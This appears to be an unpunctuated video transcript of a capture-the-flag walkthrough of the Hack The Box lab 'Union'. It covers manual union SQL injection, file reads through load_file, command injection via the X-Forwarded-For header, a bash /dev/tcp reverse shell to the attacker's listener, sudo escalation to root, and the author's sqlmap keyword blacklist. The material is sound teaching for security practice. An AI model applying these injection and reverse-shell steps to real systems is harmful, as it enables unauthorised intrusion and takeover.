 what's going on youtube this is ipsec me doing union from the uhc november qualifiers now hosting on hack the box i created this box as a way to help people learn union injections i put a few filters in place to break any type of sql map command so you really have to do all this stuff manually you find the sql injection and find out is vulnerable to union and you extract information out of the database by calling the information schema table to figure out how the database looks you get the password you log into the web application it says we have wait list your ip address for ssh access but it doesn't give you any information outside of that you can keep looking around at the database but there's not much information in it so you'd resort to the load file command out of sql which will allow you to combine the union injection to get a lfi on the server which lets you read the source code of the php application you find a configuration file that has credentials to ssh your way in looking at the source code some more specifically how the web server whitelist uip address you can find out there's a command injection vulnerability if you manipulate the headers of your request so you do that and you can get root to the application so with that being said let's jump in as always we're gonna start off with nmap so dash sc for default scripts sv enumerate versions oh a i'll put all formats pin the nmap directory and call it union and then the ip address which is 10 10 11 128 and map can take some time to run so i've already ran it looking at the results we have just two ports open the first one being http on port 80 and it's running in nginx server on ubuntu now normally when i see nginx i don't think php but nmap is telling me it's giving me a cookie called php session id so this is a php server running on nginx nothing really um special about that it's just not what i'm used to seeing and we go to 1010 11 128 and it says join the uhc november qualifiers we have a player eligibility check so we can put names like please subscribe and see what happens it says we may compete in this tournament and one interesting thing to note i put the uh thing in camelcase and it converted it into lowercase just one small thing to note nothing really too important about that but always like examine what the application is doing because you'll know a line of code behind the scenes so i'm going to click on the complete challenge and it wants me to enter a flag so i'm just going to type flag and submit and we get nothing so there's two things we can fuzz we can either do the player eligibility check first or the enter the first flag we can also do a go buster in the background we know it's a php server so let's see if we can find any extra files because we always like having some type of long running recon going in the background so go buster dir opt sec list word list uh is it word list discovery discovery then web content and raph small words dot text give it the php extension and we'll do go buster.out we need of course to tell it where it is so dash u 10 10 11 128 so now we got go busto running we could also set up some sql maps if we wanted to so i'm not going to play with this field first so this is the one i'm gonna set up a sql map with so i'm gonna open up suite and it looks like i have to actually run it so once this starts up we can send this request here uh close next come on burp starting the project intercept safely subscribe here and then i'm going to copy request to file what is it copy the file there we go and i'm going to call this flag dot request and we can do sql map dash r flag dot request dash dump and that's going to run sql map there i normally don't like running multiple copies of sql map at the same time so that's why i'm not going to um run sql map against this until the previous one finishes however we can go into repeater tab with this and play with it so it is the november qualifiers and for uhc if you've won once in this long tournament you can't play again so we could go to the uhc website and search for players i know salesian has qualified and he is not eligible also you could try my name since i create a lot of the boxes and i'm not eligible to play in this tournament so whenever testing for sql map you always want to find the query that returns something so i'm guessing if we put some random data here and hit enter this isn't really returning something in the sequel what i'm thinking about in the background this is doing like a select uh star from table where a player is equal to this name and this name returns zero so it's saying hey you may compete in the challenge but the name ipsec is returning one so we're not eligible always start with something where you can return data and a sql injection because now we can play with it if i do a single quote it the is actually erroring out but it's letting us compete in the tournament and if we do a comment we can see ooh ipsec is um not eligible and it did not put this comment here so we know uh or we don't know but we have um a good reason to have the assumption this was a valid sql injection because we have closed it off we can also try um a pound sign is also a comment in sql and we see ipsec is not eligible for playing if we did this random thing and go with this we closed off the sql query but even though we closed it off it's still returning nothing and says we may compete so if you didn't start with something valid you'd probably miss out on this sql injection additionally um there's some logic in here that's preventing like the or statement so think of it like a web application firewall so if we use some sql queries like or the waf will block us additionally this is helpful uh in this application the main reason i had done that is to prevent sql injections so if we ran sql map against this query or this page it's not going to detect anything we can go over the sql map blacklist word list at the end of the video so we have sql injection here now the next step is to do a union so i'm gonna do union select one and then if i do two we can see the query errors so we know there's only one field so at this point we need to get information out of the database so at this point i'm gonna go over to um the sql information schema so sql information schema i'm gonna add schemata to it because generally that's i think what i google for this there we go schemata table see where am i so we go over here and get all the tables um the columns table is eventually what we want so we can just start with that because this has everything the table catalog table schema which is the database name the table name the column name and everything um actually i'm going to start with the schemata table because i only want to get the databases so i think that is schema name so if i do union select schema name is it yep from information schema dot the table which was schemata we're gonna error out because um wait oh when doing the union we don't want to return data because we're putting this query into this parameter and if we return something here it says hey we are not eligible so we only got one row from this but we can do a group concat and we get all the rows so what happened here is this page is only returning the first row of your union injection or your sql query and since the very first row of this was mysql that's all it output we did group concat to take all the rows and combine them into one so that's why we have all this so we know the database we want is november because all these others are the default mysql so now we can go over and do the columns table and we can say where table schema so table schema is equal to november see i'm going to do is like for some reason i always do is like in sql queries and now we can change these things to be table name column name yeah table name and column name table name column name and me capitalizing this actually means nothing because the queries are turning it into lowercase anyways so um yeah let's see we have an error somewhere so this looks correct information schema is it dot columns yes i'm probably getting my syntax up maybe it's not is like maybe it's just like november there we go that was it um i think i was confusing like python in my sequel or something you could also do an equals and do it either way the like just gives you the ability to use like wild cards so that's why i like using like um i think if i do yeah so i need to do the wild card there or just type it all out but um the group concat isn't looking great because um just the output we could make it a bit better so at the end of here we can do a new line and we can also just put a colon in between these two and here we go we have flag 1 and players player so um the flag table has a column called one and the players table has a column called player so we can easily change this up let's just get all the players so group concat we can do player and then over here we change the query up to be from november dot players and we can see me and then all the previous players that have qualified so the other one if we went back was the um flag table so from flag and group concat let's see um [Music] oh i was like i only had one field here but no i clicked back on the repeater tab so we can do one here let's see from november.flag me hitting back a few times messed up this query there we go so now we have the very first flag of this application so let's go insert that in so we're complete the challenge enter the flag and it says welcome back your ip address has now been granted ssh access so if we go back to the nmap we can kill this go buster but less nmap union.nmap we don't have ssh running but now if i do nc zv 101011 128 port 22 22 is open so we now have access to ssh so we can ssh 10 10 11 128 however the downside is we don't have credentials but we do have this sql injection and one of the good places to go for credentials is always configuration files so let's go and do select is it i think just load file i don't know if we need from so whoops load file and then index dot php like that select let's see star from that's not it let's see i wonder if i have to go with the full path enviro www.html there we go so i wanted the full path of the file and we can see the sql map killer i'll go over that at the end but the main thing i want to get is this config.php if we looked at go buster output it probably will tell us let's see go buster.out let's um grab v403 to hide those and we could have got config.php from here but always good to get it from the actual php file so let's do config.php and we can see there are credentials we have uhc and uhc11 globalpw so let's try logging into the application so ssh uhc at 10 10 11 128 put in the password and we have logged in now one thing was really weird behind the scenes is the web server um granted our ip address access to um the socket or ssh and normally the web user doesn't have that ability to because it's a low privileged user and iptables is a um like thing only root normally can do so let's go take a look closer at the web source to see exactly how that happened so i'm going to do i'm going to guess it's in firewall.php and we can see if session authenticated access denied let's see what else we have here ah so if is set the header http exported for or i think it's just exported for in the header then set the ip to that else set the ip to remote address which is just from the client and then the next line it's doing a pseudo iptables with that ip address so let's go and play with this real quick uh we have to go i think i was intercepting no i was not let's just um hit firewall.php go here burp suite refresh this page intercept that's not it that's index here we go so it's saying it will take x forwarded four header and if we look at the query we have injection right here so what i'm going to do is a semicolon a command and then another semicolon so sleep one let's try this go to the page waiting a few seconds um i was expecting it to come back by now this is longer than a one second sleep maybe we need two line breaks there let's see one millisecond there we go let's do two see if we get two milliseconds here we do you guessed it we're gonna try three and this will be the final confirmation that we have some type of rce so now all that's left is getting over a shell so bash dash c bash dash i dev tcp 10 10 14 i'm guessing i'm eight zero and one like that let's see ipaddr oh wait i'm on this box like wait i'm not 10 10 11. yeah i'm 10 10 14 8. so nc lvmp 9001 send this request and we didn't get anything zero and one like that there we go i forgot the one and we are the dub dub dub dash data user um doesn't look good but if you remember if we go back to this the very next line was us doing pseudo so i'm going to try sudo l and we can see this user is able to do a blanket pseudo command so sudo su dash and now we are the root user so that is the box i did say i would go over the thing i did to blacklist sql map so we'll do that real quick and then call it a video so if i do i think index.php we have bad words sleep 0x which is hex and then double star which is for comment and then dash dash space for characters and this is the key one that blocks a lot of sql map because sql map we're not doing like when i did the um dash dash like this command waiting they're just hanging the server i may have i probably did with my reverse shell let's clear this okay so box isn't 100 stable that's one of the reason why i guess i normally don't use nginx when configuring php because out of the box it does that ah i digress um but whenever i do this dash dash this is the well dash space is a comment if you just do three dashes um let's see we gotta do ipsec real quick not eligible if i don't do that space it's not actually commenting out so what sql map likes doing is it does four random characters at the end like asd or something so that is a blacklist word and all i did to build this um blacklist is i ran sql map through burp suite and then looked at the queries it was sending um if null and then um or so or was a big one i had a blacklist which i didn't like but yeah so these five i guess or if null uh the weird way to do a comment and then two stars hex for tamper scripts and then sleep were what i did to blacklist it the other important thing is you have to make it echo the same exact thing otherwise it would be a boolean injection so like if i ran sql map let's actually do this real quick so i can just do player is equal to some type of junk copy to file player dot request save then sql map dash r player dot request i think i do dash t for threads that may make it go faster so dash dash dump 50 and we'll see how quickly this sql map runs and after we do it this way we're going to edit it and then um do a second sql map i thought i did dump so it shouldn't ask questions but nothing's injectable so let's go and edit it and i just realized i probably need a shell on the server to edit it because the uhc user can't edit the web server so get a second shell uh sudo su python3 c port pty pty spawn then bash www.html raw minus echo okay so now i should be able to edit actually export term is equal to x term there we go so if i edit firewall.php now oh actually index.php we can take one character off of this so just make it not capital c and let's run this sql map again and let's see if it says it's boolean injection because now if we um go back to burp suite and try this injection we have isd uh maybe thread 50 is not the right thing to do on this application oh wait it's my reverse shell let's see um pass wd put a password in root so now we don't need the web shell to get in see did that do it there we go so it says congratulations if i put a single quote here did i not save it let's see s u dash login for www.html v index okay so if i put a bad word in it should have done that i need a space after or for that bad word to take effect and sql map i probably have to change like the level of verbosity or verbosity whatever that word is so that demo isn't really going as well as i thought it would because i thought it would be able to detect that if this error message was different let's see dude dbms oh dash batch is no question it's not dump my sequel like that and we can do level five risk three so the level in risk makes escrow map just test for more things and five is the max level three is the highest risk so hopefully this will be able to say um it's vulnerable if not oh well so i'm gonna pause the video and we'll come back when this finishes it is a good thing i paused the video because this took like 45 minutes to run and it doesn't seem like it found anything i was really expecting it to let's see user agent does not it tested like all the http headers as well i guess i probably could have just specified the parameter but yeah um it does not detect it as being injectable even with the uh error message being slightly different which really surprised me but yeah hope you guys enjoyed that take care and i will see you all next week